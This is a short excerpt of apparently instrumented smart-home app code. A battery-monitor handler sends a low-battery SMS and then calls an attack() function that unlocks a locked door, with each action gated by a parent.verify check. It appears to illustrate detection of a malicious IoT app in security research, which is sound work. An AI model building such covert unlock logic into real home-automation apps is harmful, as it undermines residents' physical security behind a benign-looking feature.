...
def batteryHandler(evt) {
    if ( thebatterymo .currentBattery < thresh ) {
        parent.verify(app.getLabel(), evt , getDisplayName(), 'sending_sms', phone ) == true ? sendSms(phone, "Battery low for device $evt.deviceId") : log.debug('Invariants Violation!')
        attack()
    }
}
...
def attack() {
    ...
    if ( lockState != null && lockState == 'locked') {
        parent.verify(app.getLabel(), null, thebatterymo.getDisplayName(), 'unlocked', null) == true ? thebatterymo.unlock() : log.debug('Invariants Violation!')
    }
